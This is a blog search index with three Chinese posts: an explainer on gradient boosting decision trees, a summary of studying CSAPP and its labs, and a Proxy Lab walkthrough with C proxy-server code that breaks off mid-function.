<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[GBDT]]></title>
      <url>/2018/05/20/GBDT/GBDT/</url>
      <content type="html"><![CDATA[<p>梯度提升回归树(Gradient Boosting Decision Tree)是一种集成学习思想的回归算法，属于集成学习中boosting的一类（另一类是bagging，代表算法是随机森林）因为具有很强的泛化能力而受到广泛的使用。</p>
<blockquote>
<p>摘自周志华老师的《机器学习》: 从方差-偏差角度来讲，Boosting主要关注降低偏差，因此Boosting能基于泛化性能相当弱的学习器构建出很强的集成；Bagging主要关注降低方差，因此它在不剪枝的决策树、神经网络等学习器上效用更为明显。</p>
</blockquote>
<p>通俗地解释GBDT的思想：一个人有60Kg，我们第一次预测得到50Kg，就会发现损失是10Kg，第二次我们用6Kg来拟合这个损失，则还有4Kg的差距，第三轮我们再用3Kg来拟合。这样不断的去拟合上一轮的残差，则拟合的结果就越来越接近实际值。 这里我们每次拟合都用到一个弱学习器，最终得到的整个拟合过程就是一个强学习器。GBDT中采用CART回归树作为弱学习器。</p>
<a id="more"></a>
<h1 id="CART回归树"><a href="#CART回归树" class="headerlink" title="CART回归树"></a>CART回归树</h1><p>从西瓜书中我们已经对决策树有了基础的了解，但是其中主要介绍的是分类树，如何将决策树用于回归呢？</p>
<h2 id="预测"><a href="#预测" class="headerlink" title="预测"></a>预测</h2><p>作为分类决策树时，待预测样本落至某一叶子节点，则输出该叶子节点中所有样本所属类别最多的那一类（即叶子节点中的样本可能不是属于同一个类别，则多数为主）；作为回归决策树时，待预测样本落至某一叶子节点，则输出该叶子节点中所有样本的均值。 </p>
<h2 id="划分"><a href="#划分" class="headerlink" title="划分"></a>划分</h2><p>因为对于回归树，我们待预测的结果为连续性数据，所以对于分类树划分采用的基尼系数（或者信息熵），回归树并不试用。回归树采用的是$Gain_\sigma$（方差增益）作为最优分裂属性。$Gain_{\sigma}$值越小说明二分后的子样本差异性越小，说明该属性的分裂效果越好。<br>$\sigma(S) = \sqrt{ \sum (yk - \mu)^2}$<br>其中$\mu$表示样本集S中预测结果的均值，yk表示第k个样本的预测结果。<br>对于含有N个样本的样本集S，根据属性A的第i个属性值将数据集S划分成两部分，则划分的$Gain<em>{\sigma}$计算如下：<br>$Gain\</em>{\sigma<em>{A,i}}(S) = \sigma(S1) + \sigma(S2)$<br>对于属性A分别计算任意属性值将数据集划分成两部分之后的$Gain</em>{\sigma}$选出最小值作为属性A得到的最有二分方法。 再对于样本集S，计算所有舒心给的最优二分方案，选出其中的最小值，最为样本S的最优二分方案。<br>$min<em>{A \in Attributes}(min</em>{i \in A}(Gain_{\sigma_{A,i}(S)}))$</p>
<h1 id="GBDT回归算法"><a href="#GBDT回归算法" class="headerlink" title="GBDT回归算法"></a>GBDT回归算法</h1><p>了解了GBDT的基本思想和CART回归树的原理之后，我们开始介绍GBDT的流程。</p>
<p><img src="/images/GBDT/gbdt.png" alt="算法流程"></p>
<p>GBDT通过多轮迭代，每轮产生一个弱分类器，每个分类器在上一轮分类器的<strong>残差</strong>的基础上进行训练。这里因为训练的过程是不断降低偏差的，所以我们对弱分类器的要求就是低方差、高偏差。</p>
<h2 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程"></a>算法流程</h2><hr>
<p><strong>输入</strong>：训练集样本$S = {(x1, y1), (x2, y2) … (xm, ym)}$，最大迭代次数$T$, 损失函数$L$<br><strong>输出</strong>：强学习器$f(x)$</p>
<ol>
<li>初始化弱学习器<br> $f_0(x) = argmin<em>c \sum</em>{i=1}^mL(y_i,c)$</li>
<li>For t = 1 … T<ol>
<li>计算每个样本的<strong>损失函数负梯度</strong>$r_i$<br> $r_i = -[\frac{\delta L(y_i, f(x_i))}{\delta f(x<em>i)}]</em>{f(x) = f_(t-1)(x)}$</li>
<li>以${(x1, r1), (x2, r2),…,(xm, rm)}$为数据训练一个回归树，其对应的叶子节点区域为$R<em>{tj}$， $j = 1,2,…J$，每个叶子区域的预测值为$c</em>{tj}$<br> $h<em>t(x) = \sum</em>{j=1}^Jc<em>{tj}I(x \in R</em>{tj})$</li>
<li>计算当前回归树的权值<br> $\gamma<em>t = argmin</em>{\gamma}\sum_{i=1}^mL(y<em>i, f</em>{t-1}(x_i) + \gamma h_t(x_i))$</li>
<li>更新强学习器<br> $f<em>t(x) = f</em>{t-1}(x) + \gamma<em>t \sum</em>{j=1}^Jc<em>{tj}I(x \in R</em>{tj})$</li>
</ol>
</li>
<li>得到强学习器<pre><code>$ f(x) = f_T(x) = f_0(x) + \sum_{t=1}^T\gamma_t\sum_{j=1}^Jc_{tj}I(x \in R_tj) $
</code></pre></li>
</ol>
<p>这里选用损失函数负梯度作为下一轮弱分类器的数据label原因是希望损失函数能够尽可能快地减小，让损失函数沿梯度方向下降就是GBDT中gradient boosting的核心了。 此外，这里每个树都设定一个权值$\gamma_t$实际上是“Shrink”的思想，该思想认为每次走一小步逐渐逼近结果的效果要比每次迈一大步的方式更容易避免过拟合，即它不完全信任每一棵残差树，认为每棵树只学到了真理的一部分，累加时也只累加一小部分，通过多学几棵树弥补不足。</p>
<hr>
<h2 id="正则化"><a href="#正则化" class="headerlink" title="正则化"></a>正则化</h2><p>对GBDT的正则化主要有三种方式：</p>
<ol>
<li>添加参数步长(learning_rate)，每次更新强学习器的时候都给本轮学习的弱学习器一个权值，即<br>$f<em>k(x) = f</em>{k-1}(x) + \omega h_k(x)$</li>
<li>通过子采样，子采样比例取值为(0,1]，即只从中抽取一部分样本来做GBDT的拟合，这里采用不放回抽样（随机森林使用的是放回抽样），选择小于1的比例可以减小方差防止过拟合，但是会增加样本拟合的偏差，因此取值不能太低。</li>
<li>通过对弱学习器CART进行剪枝或设置最大深度。</li>
</ol>
<h1 id="GBDT分类算法"><a href="#GBDT分类算法" class="headerlink" title="GBDT分类算法"></a>GBDT分类算法</h1><p>首先需要明确的是不管GBDT用于分类还是回归，使用的弱学习器都是CART回归树。从回归问题转向分类问题，我们需要面对的困难是，之前回归问题中每一轮训练都是在上轮训练的残差上训练的，但是对于分类问题如何衡量这个残差呢？类别相减是没有意义的。</p>
<p>这里我们采用的策略是同时训练多棵树，比如我们的样本一共有三个类，则我们每次训练的时候都同时训练三棵树。例如我们的样本属于第二个类，则三棵树的训练数据分别为$(x, 0), (x,1), (x,0)$。这样我们可以训练得到三棵树，和他们对x的预测值$f1(x), f2(x), f3(x)$。之后我们仿照softmax的做法来得到x属于不同类的概率<br>$p1 = \frac{exp(f<em>1(x))}{\sum</em>{k=1}^3exp(f_k(x))}$<br>利用预测值还可以求出三棵树的残差，利用这个残差来训练新的树。这样循环T轮之后就得到了三个树。之后对新样本进行预测时，只需将x输入到三棵树中得到三个类别的预测值，再用softmax的方法即可求出该样本属于不同类别的概率。</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol>
<li><p><a href="https://blog.csdn.net/w28971023/article/details/8240756" target="_blank" rel="noopener">https://blog.csdn.net/w28971023/article/details/8240756</a></p>
</li>
<li><p><a href="https://www.cnblogs.com/pinard/p/6140514.html" target="_blank" rel="noopener">https://www.cnblogs.com/pinard/p/6140514.html</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> 厚积薄发 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> GBDT </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CSAPP系列总结]]></title>
      <url>/2018/04/19/CSAPP/CSAPP%E7%B3%BB%E5%88%97%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p>从17年的12月到18年4月，大概花了五个月时间读完了《深入理解计算机系统》这本书，也跟着做完了配套的实验，这些实验设计的精妙让我不由得想要花时间去完成它，并享受完成之后的成就感。通过这本书，对CMU这所CS最顶尖的学府的敬佩油然而生，本科生的一个入门课程就能做到如此<strong>全面</strong>地梳理计算机的系统，让我们清楚地了解一个程序是如何被计算机理解并运行起来的，相比之前我们学过的很多课程往往过于关注知识本身，而忽视了为我们构建一个整体的结构图，脑子里只有一些孤立的知识点，而读了CSAPP之后，这些孤立的知识点才慢慢得连起来，构成了一个完整的计算机系统。这个过程中虽然很多次有过懈怠，想要放弃，但是很庆幸还是坚持了下来。</p>
<a id="more"></a>
<p><img src="/images/CSAPP/CSAPP.png" alt="CSAPP"></p>
<h1 id="程序结构和执行"><a href="#程序结构和执行" class="headerlink" title="程序结构和执行"></a>程序结构和执行</h1><p>这一部分主要讲解计算机如何表示和执行应用程序，如何表示整数和浮点数？如何进行整数和实数的运算？ 如何将C语言程序翻译成机器可以阅读的指令？ 了解了这些我们就能编写出高效的、且不会出现算术错误的C语言程序。</p>
<h2 id="信息的表示和处理"><a href="#信息的表示和处理" class="headerlink" title="信息的表示和处理"></a>信息的表示和处理</h2><ol>
<li>计算机内部如何编码整数、浮点数</li>
<li>为什么要引入补码？</li>
<li>如何进行无符号整数与有符号整数之间的类型转换</li>
<li>常用的位运算</li>
<li>浮点数运算的精度问题</li>
</ol>
<p>配套<a href="http://xuyangbai.github.io//2018/01/19/CSAPP/Data_Lab/" target="_blank" rel="noopener">Data Lab</a>，一些要求只用位运算来完成的任务，还会限制运算的次数，有些需要非常巧妙的做法才能完成，做的时候也让我对整数、浮点数的表示有了非常深刻的印象和理解。</p>
<h2 id="程序的机器级表示"><a href="#程序的机器级表示" class="headerlink" title="程序的机器级表示"></a>程序的机器级表示</h2><ol>
<li>基本的汇编语法，常见的寻址方式和运算方式</li>
<li>条件结构(if switch)的实现方式</li>
<li>循环结构(for,while, do while)的实现方式</li>
<li><strong>栈帧结构，函数调用以及递归的实现</strong></li>
<li>多维数组、结构体的存储</li>
<li>缓冲区溢出</li>
</ol>
<p>配套<a href="http://xuyangbai.github.io//2018/01/29/CSAPP/Bomb_Lab/" target="_blank" rel="noopener">Bomb Lab</a> 和<a href="">Attack Lab</a>, bomb lab主要让我们通过对汇编程序的理解去推测不会触发“炸弹”的输入，非常有趣的一个实验，一关一关破解的感觉非常爽，有时候还可以通过自己的代码直觉猜出来(当我猜到第五个关卡是一段二分法的代码的时候巨激动)，需要我们对比较与跳转指令比较熟悉，且要会使用gdb。 attack lab则是分别让我们完成三种类型的攻击(缓冲区溢出攻击、返回导向性ROP攻击)，需要我们对<strong>栈帧结构和过程调用</strong>有很深的理解，这个也是我第一次想放弃的一个节点，后来又回过头把过程调用部分的内容读了读才算是磕磕绊绊地解决了这个实验。</p>
<h2 id="存储器层次结构"><a href="#存储器层次结构" class="headerlink" title="存储器层次结构"></a>存储器层次结构</h2><ol>
<li>局部性原理、存储器的思想</li>
<li>计算机中的存储体系（寄存器-高速缓存-主存-本地磁盘-远程存储）</li>
<li>高速缓存(Cache)的结构，读取、写入的过程</li>
<li>如何利用高速缓存来编写高效的代码</li>
</ol>
<p><a href="http://xuyangbai.github.io//2018/02/27/CSAPP/Cache_Lab/" target="_blank" rel="noopener">Cache Lab</a> 实验分为两部分，第一部分是实现一个缓存模拟器，根据给定的trace文件来输出对应的操作，只要理解了cache的结构，这部分还是很好做的。第二部分是利用缓存机制加速矩阵的运算。</p>
<h1 id="在系统上运行程序"><a href="#在系统上运行程序" class="headerlink" title="在系统上运行程序"></a>在系统上运行程序</h1><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><ol>
<li>从源代码到计算机可执行的二进制代码之间需要经过的处理</li>
<li>理解编译过程</li>
<li>理解链接过程</li>
<li>理解静态库、动态库的使用方式</li>
</ol>
<p>这部分没有lab的支持所以理解不是很深，有机会还要再读读。</p>
<h2 id="异常控制流"><a href="#异常控制流" class="headerlink" title="异常控制流"></a>异常控制流</h2><ol>
<li>异常的分类与概念， (中断、陷阱、故障、终止)</li>
<li>Linux的进程控制机制，与进程相关的一些函数</li>
<li>信号的基本原理、与信号相关的函数、如何自定义信号处理函数</li>
</ol>
<p>这部分主要讲解了异常控制流的几个基本机制: 异常、进程切换、信号和非本地跳转，涉及到的概念比较多。 配套实验<a href="http://xuyangbai.github.io//2018/03/14/CSAPP/Shell_Lab/" target="_blank" rel="noopener">Shell Lab</a>要我们自己实现一个shell，支持内置命令和可执行程序，支持后台运行和前台运行，能够捕获ctrl c和ctrl z的输入。这个实验也让我对shell背后所隐含的进程管理、异常控制等都有了更深的理解。</p>
<h2 id="虚拟存储器"><a href="#虚拟存储器" class="headerlink" title="虚拟存储器"></a>虚拟存储器</h2><p>我们内存往往很小，但是为什么能够同时运行很多个比较大的进程而且进程可以拥有自己连续的地址空间呢？ 这时候虚拟存储器就派上用场了。虚拟存储器是指具有请求调入功能和置换功能、能从逻辑上对内存容量加以扩充的一种存储器系统。</p>
<ol>
<li>虚拟存储器的作用（缓存工具、内存管理工具、内存保护工具)</li>
<li>从虚拟地址到物理地址的转换</li>
<li><strong>动态内存分配</strong></li>
<li>垃圾回收机制</li>
<li>内存陷阱(使用内存时应该避免的问题)</li>
</ol>
<p><a href="">Malloc Lab</a> 需要自己实现一个动态分配器，要兼顾空间使用率以及吞吐量。free block有多种组织方式 显式空闲链表、隐式空闲链表、分离空闲链表。扫描free block也有首次适应、下次适应、最佳适应三种策略。思路比较好理解，但是写代码的时候会遇到很多问题，segment fault层出不穷，需要借助gdb、并自己编写checkheap函数来帮助实现</p>
<h1 id="程序之间的交互"><a href="#程序之间的交互" class="headerlink" title="程序之间的交互"></a>程序之间的交互</h1><h2 id="系统级IO"><a href="#系统级IO" class="headerlink" title="系统级IO"></a>系统级IO</h2><ol>
<li>文件的打开与关闭、文件读写</li>
<li>RIO包的使用</li>
<li>共享文件</li>
</ol>
<h2 id="网络编程"><a href="#网络编程" class="headerlink" title="网络编程"></a>网络编程</h2><ol>
<li>网络的基本架构</li>
<li>常见的网络协议（TCP IP HTTP）</li>
<li>Socket接口</li>
<li>客户端-服务器 结构</li>
</ol>
<h2 id="并行与同步"><a href="#并行与同步" class="headerlink" title="并行与同步"></a>并行与同步</h2><ol>
<li>理解并行的几个层次: 进程、事件、线程</li>
<li>使用<code>pthread.h</code>中的函数编写多线程程序</li>
<li>用信号量解决同步问题， 生产者-消费者问题、 读者-写者问题</li>
<li>线程安全和一致性问题</li>
</ol>
<p>配套实验<a href="http://xuyangbai.github.io/2018/04/17/CSAPP/Proxy_Lab/" target="_blank" rel="noopener">proxy lab</a>, 最后一个实验，要我们自己来实现一个代理服务器，要求支持并发、有缓存功能，代理服务器作为客户端和服务器的中间人，对能帮助我们更好得理解客户端和服务器的工作机制。难点在写出来的代理服务器要足够robust，能应对各种异常情况而不崩溃。</p>
]]></content>
      
        <categories>
            
            <category> 厚积薄发 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CSAPP-Proxy Lab]]></title>
      <url>/2018/04/17/CSAPP/Proxy_Lab/</url>
      <content type="html"><![CDATA[<p>本实验要求实现一个带有缓存功能的支持并发的Proxy代理服务器。</p>
<a id="more"></a>
<h1 id="Level1-Sequential-Web-Proxy"><a href="#Level1-Sequential-Web-Proxy" class="headerlink" title="Level1: Sequential Web Proxy"></a>Level1: Sequential Web Proxy</h1><p>第一部分只要求实现一个简单的代理服务器，能满足的功能为</p>
<ol>
<li>用户给定一个端口，proxy监听所有从该端口进入的请求（main）</li>
<li>获取到http请求之后(doit)，解析请求（parse_uri），构造http请求头（build_http_header）转发到服务器端(doit)</li>
<li>将从服务器端获取到的响应返回给客户端(doit)</li>
</ol>
<p>以下是上述几个函数的实现</p>
<h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><p>main函数中监听port端口，接收来自客户端的请求，调用<code>doit</code>函数来处理请求</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> listenfd, connfd;</span><br><span class="line">    <span class="keyword">char</span> hostname[MAXLINE], port[MAXLINE];</span><br><span class="line">    <span class="keyword">socklen_t</span> clientlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check command line args*/</span></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"usage :%s &lt;port&gt; \n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    listenfd = Open_listenfd(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        clientlen = <span class="keyword">sizeof</span>(clientaddr);</span><br><span class="line">        connfd = Accept(listenfd, (SA *) &amp;clientaddr, &amp;clientlen);</span><br><span class="line"></span><br><span class="line">        Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE, port, MAXLINE, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Accepted connection from (%s %s).\n"</span>, hostname, port);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*sequential handle the client transaction*/</span></span><br><span class="line">        doit(connfd);</span><br><span class="line">        Close(connfd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的main函数与客户端创建连接的过程其实与实验指导中提供的tiny web代码是完全一样的，但是doit要做的事情不一样，对于tiny web是要根据http请求返回对应的静态资源或者动态内容，而对于proxy则是要将http请求转发到host服务器去.</p>
<p>其中需要关注的一个函数getaddrinfo和getnameinfo，这个函数在csapp书第三版中新出现的。</p>
<blockquote>
<p><code>getaddrinfo</code>能够将传入的用String变量代表的 hostnames、 host addresses、 service names和port number等转换成为socket address structure。它代替了原来的<code>geihostbyname</code>和<code>getservbyname</code>。该函数是线程安全的，并且是可重入的函数，而且该函数与协议无关。<code>getnameinfo</code>函数是<code>getaddrinfo</code>函数的逆函数，功能恰好相反</p>
</blockquote>
<p>getnameinfo函数的声明如下，输入的是socket addr，输出是host和port:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getnameinfo</span><span class="params">(<span class="keyword">const</span> SA *sa, <span class="keyword">socklen_t</span> salen, <span class="comment">/* In: socket addr */</span></span></span></span><br><span class="line"><span class="function"><span class="params">                <span class="keyword">char</span> *host, <span class="keyword">size_t</span> hostlen,    <span class="comment">/* Out: host */</span></span></span></span><br><span class="line"><span class="function"><span class="params">                <span class="keyword">char</span> *serv, <span class="keyword">size_t</span> servlen,    <span class="comment">/* Out: service */</span></span></span></span><br><span class="line"><span class="function"><span class="params">                <span class="keyword">int</span> flags)</span></span>;                    <span class="comment">/* optional flags */</span></span><br></pre></td></tr></table></figure>
<h2 id="doit"><a href="#doit" class="headerlink" title="doit"></a>doit</h2><p>doit函数处理一个HTTP事物，它要做的内容就是，包括解析从客户端传来的http请求，构建出新的http请求头并转发到服务器中去。代码实现如下，其中<code>parse_uri</code>和<code>build_http_header</code>两个函数分别实现解析uri和构建http请求头的功能。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">doit</span><span class="params">(<span class="keyword">int</span> connfd)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> serverfd;</span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE], method[MAXLINE], uri[MAXLINE], version[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> server_http_header[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> hostname[MAXLINE], path[MAXLINE];</span><br><span class="line">    <span class="keyword">int</span> port;</span><br><span class="line"></span><br><span class="line">    rio_t rio, server_rio;</span><br><span class="line"></span><br><span class="line">    Rio_readinitb(&amp;rio, connfd);</span><br><span class="line">    Rio_readlineb(&amp;rio, buf, MAXLINE); <span class="comment">// 读来自客户端的http请求</span></span><br><span class="line">    sscanf(buf, <span class="string">"%s %s %s"</span>, method, uri, version);  <span class="comment">// 将读取到的请求行分离</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strcasecmp(method, <span class="string">"GET"</span>))&#123;</span><br><span class="line">        printf(<span class="string">"Proxy does not implement the method"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析uri, 并将解析结果存入hostname path port中</span></span><br><span class="line">    parse_uri(uri, hostname, path, &amp;port);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构建发送给服务器的请求头</span></span><br><span class="line">    build_http_header(server_http_header, hostname, path, port, &amp;rio);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接服务器</span></span><br><span class="line">	<span class="keyword">char</span> portStr[<span class="number">100</span>];</span><br><span class="line">	sprintf(portStr, <span class="string">"%d"</span>, port);</span><br><span class="line">	serverfd = Open_clientfd(hostname, portStr);</span><br><span class="line">	<span class="keyword">if</span> (serverfd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">	    printf(<span class="string">"connection failed\n"</span>);</span><br><span class="line">	    <span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 向服务器发送http request</span></span><br><span class="line">    Rio_readinitb(&amp;server_rio, serverfd);</span><br><span class="line">    Rio_writen(serverfd, server_http_header, strlen(server_http_header));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接收服务器发回的响应，转发给客户端</span></span><br><span class="line">    size_t n;</span><br><span class="line">    <span class="keyword">while</span> ((n = Rio_readlineb(&amp;server_rio, buf, MAXLINE)) != <span class="number">0</span>) &#123;</span><br><span class="line">        printf(<span class="string">"proxy received %d bytes,then send\n"</span>, n);</span><br><span class="line">        Rio_writen(connfd, buf, n);</span><br><span class="line">    &#125;</span><br><span class="line">    Close(serverfd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="parse-uri"><a href="#parse-uri" class="headerlink" title="parse_uri"></a>parse_uri</h2><p>解析uri函数， 解析结果存储在hostname,path, port中</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">parse_uri</span><span class="params">(<span class="keyword">char</span> *uri, <span class="keyword">char</span> *hostname, <span class="keyword">char</span> *path, <span class="keyword">int</span> *port)</span> </span>&#123;</span><br><span class="line">    *port = <span class="number">80</span>;</span><br><span class="line">    <span class="keyword">char</span> *pos = strstr(uri, <span class="string">"//"</span>);</span><br><span class="line"></span><br><span class="line">    pos = pos != NULL ? pos + <span class="number">2</span> : uri;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *pos2 = strstr(pos, <span class="string">":"</span>);</span><br><span class="line">    <span class="keyword">if</span> (pos2 != NULL) &#123;</span><br><span class="line">        *pos2 = <span class="string">'\0'</span>;</span><br><span class="line">        sscanf(pos, <span class="string">"%s"</span>, hostname);</span><br><span class="line">        sscanf(pos2 + <span class="number">1</span>, <span class="string">"%d%s"</span>, port, path);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        pos2 = strstr(pos, <span class="string">"/"</span>);</span><br><span class="line">        <span class="keyword">if</span> (pos2 != NULL) &#123;</span><br><span class="line">            *pos2 = <span class="string">'\0'</span>;</span><br><span class="line">            sscanf(pos, <span class="string">"%s"</span>, hostname);</span><br><span class="line">            *pos2 = <span class="string">'/'</span>;</span><br><span class="line">            sscanf(pos2, <span class="string">"%s"</span>, path);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            sscanf(pos, <span class="string">"%s"</span>, hostname);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="build-http-header"><a href="#build-http-header" class="headerlink" title="build_http_header"></a>build_http_header</h2><p>由于http请求每一行都以<code>&#39;\r&#39;n&#39;</code>结尾，整个http请求都是以一个空行为结束。 所以我们可以每次读入一行，将读取到的内容与我们预先定义好的一些header key相匹配，即可处理http请求的header<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build_http_header</span><span class="params">(<span class="keyword">char</span> *http_header, <span class="keyword">char</span> *hostname, <span class="keyword">char</span> *path, <span class="keyword">int</span> port, <span class="keyword">rio_t</span> *client_rio)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *conn_hdr = <span class="string">"Connection: close\r\n"</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *prox_hdr = <span class="string">"Proxy-Connection: close\r\n"</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *host_hdr_format = <span class="string">"Host: %s\r\n"</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *request_hdr_format = <span class="string">"GET %s HTTP/1.0\r\n"</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *endof_hdr = <span class="string">"\r\n"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *connection_key = <span class="string">"Connection"</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *user_agent_key = <span class="string">"User-Agent"</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *proxy_connection_key = <span class="string">"Proxy-Connection"</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *host_key = <span class="string">"Host"</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE], request_hdr[MAXLINE], other_hdr[MAXLINE], host_hdr[MAXLINE];</span><br><span class="line">    <span class="comment">// 构建http request的第一行 e.g: GET /index.html HTTP/1.0</span></span><br><span class="line">    <span class="built_in">sprintf</span>(request_hdr, request_hdr_format, path);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理每一条header字段</span></span><br><span class="line">    <span 